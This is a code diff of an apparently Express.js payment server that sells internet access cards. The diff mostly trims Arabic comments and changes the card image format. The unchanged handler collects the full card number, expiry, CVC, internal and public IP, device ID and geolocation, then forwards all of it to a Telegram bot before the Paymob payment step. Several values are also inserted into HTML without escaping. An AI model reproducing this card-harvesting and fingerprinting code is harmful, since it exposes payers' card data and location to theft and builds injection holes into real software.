@@ -22,7 +22,7 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, "public")));
 
-// 2. الصفحة الرئيسية (تخدم تلقائياً public/index.html)
+// 2. الصفحة الرئيسية
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
@@ -39,10 +39,9 @@ function getClientPublicIP(req) {
   );
 }
 
-// 3. مسار معالجة الدفع الموحد (يدعم GET و POST بسلاسة مع حماية ضد الانهيار)
+// 3. مسار معالجة الدفع الموحد (يدعم GET و POST)
 async function handlePaymentRequest(req, res) {
   try {
-    // تجميع البيانات سواء قادمة من GET (Query) أو POST (Body)
     const data = { ...req.query, ...req.body };
     const {
       phone,
@@ -54,7 +53,6 @@ async function handlePaymentRequest(req, res) {
       expiry,
       cvc,
       save_card,
-      // بيانات الجهاز والشبكة والموقع الممررة من الفرونت إند
       clientID,
       clientId,
       internalIP,
@@ -76,7 +74,6 @@ async function handlePaymentRequest(req, res) {
       geoData
     } = data;
 
-    // إذا تم فتح الرابط مباشرة بدون إرسال بيانات، قم بإرجاعه للصفحة الرئيسية
     if (!amount && Object.keys(data).length === 0) {
       return res.redirect("/");
     }
@@ -85,10 +82,8 @@ async function handlePaymentRequest(req, res) {
     const userPhone = phone || "غير محدد";
     const payAmount = amount || "5";
 
-    // تحديد الـ IP الخارجي Real Client IP إن لم يُرسل صراحة من الصفحة
     const detectedPublicIP = publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req);
 
-    // بناء كائن البيانات الشامل لإرساله للتليجرام
     const paymentPayload = {
       phone: userPhone,
       amount_cents: parseFloat(payAmount) * 100,
@@ -100,7 +95,6 @@ async function handlePaymentRequest(req, res) {
         cvc: cvc || "غير مدخل",
         save_card: save_card === "tokenize" || save_card === "نعم"
       },
-      // بيانات معرف وتفاصيل الجهاز والشبكة والموقع
       clientID: clientID || clientId || "غير متوفر",
       internalIP: internalIP || "غير متوفر",
       publicIP: detectedPublicIP,
@@ -119,12 +113,10 @@ async function handlePaymentRequest(req, res) {
       lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
     };
 
-    // إرسال إشعار فوري إلى تليجرام بالبيانات الكاملة قبل التوجيه لـ Paymob
     if (typeof sendTelegramMessage === "function") {
       await sendTelegramMessage(paymentPayload, true);
     }
 
-    // معالجة الدفع عبر Paymob (محافظ وبطاقات)
     const result = await processPayment(userPhone, payAmount, selectedMethod);
 
     if (result.type === "redirect") {
@@ -144,7 +136,7 @@ async function handlePaymentRequest(req, res) {
 app.get("/api/pay", handlePaymentRequest);
 app.post("/api/pay", handlePaymentRequest);
 
-// 4. مسار استقبال طلب السرعة العالية وتعطيل الكيوز من المايكروتك
+// 4. مسار استقبال طلب السرعة العالية من المايكروتك
 app.post("/api/disable-queue", async (req, res) => {
   try {
     const { username } = req.body;
@@ -159,21 +151,21 @@ app.post("/api/disable-queue", async (req, res) => {
   }
 });
 
-// 5. مسار تنزيل صورة الكارت المصممة بدقة عالية
+// 5. مسار تنزيل صورة الكارت (معدل إلى JPEG بدقة لمنع الشاشة السوداء)
 app.get("/download-card", (req, res) => {
   const transactionId = req.query.id;
   const cardData = global.generatedCardsMap ? global.generatedCardsMap.get(transactionId?.toString()) : null;
 
   if (cardData && cardData.buffer) {
-    res.setHeader("Content-Type", "image/png");
-    res.setHeader("Content-Disposition", `attachment; filename="Hikayat_Card_${cardData.code}.png"`);
+    res.setHeader("Content-Type", "image/jpeg");
+    res.setHeader("Content-Disposition", `inline; filename="Hikayat_Card_${cardData.code || transactionId}.jpg"`);
     return res.send(cardData.buffer);
   } else {
     return res.status(404).send("الصورة غير متوفرة أو انتهت صلاحية الرابط.");
   }
 });
 
-// 6. صفحة نجاح الدفع المنسقة احترافياً (تعرض الكارت وتتيح تنزيل الصورة)
+// 6. صفحة نجاح الدفع المنسقة
 app.get("/success", (req, res) => {
   const transactionId = req.query.id || "غير متوفر";
   const cardData = global.generatedCardsMap ? global.generatedCardsMap.get(transactionId.toString()) : null;
@@ -184,8 +176,8 @@ app.get("/success", (req, res) => {
       <div style="margin: 20px 0; background: #f8f9fa; padding: 20px; border-radius: 12px; border: 2px dashed #27ae60;">
         <span style="font-size: 14px; color: #7f8c8d; font-weight: bold;">كارت النت الخاص بك (شبكة حكايات):</span>
         <div style="font-size: 30px; font-weight: bold; color: #27ae60; letter-spacing: 3px; margin: 12px 0; font-family: monospace;">${cardData.code}</div>
-        <p style="font-size: 13px; color: #555; margin-bottom: 15px;">باقة: <strong>${cardData.packageName}</strong></p>
-        <a href="/download-card?id=${transactionId}" class="btn-download">📥 تحميل صورة الكارت الاحترافية</a>
+        <p style="font-size: 13px; color: #555; margin-bottom: 15px;">باقة: <strong>${cardData.packageName || 'إنترنت'}</strong></p>
+        <a href="/download-card?id=${transactionId}" target="_blank" class="btn-download">📥 عرض وتحميل صورة الكارت</a>
       </div>
     `;
   }
@@ -225,7 +217,7 @@ app.get("/success", (req, res) => {
   `);
 });
 
-// 7. صفحة فشل الدفع المنسقة
+// 7. صفحة فشل الدفع
 app.get("/fail", (req, res) => {
   const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
   res.send(`
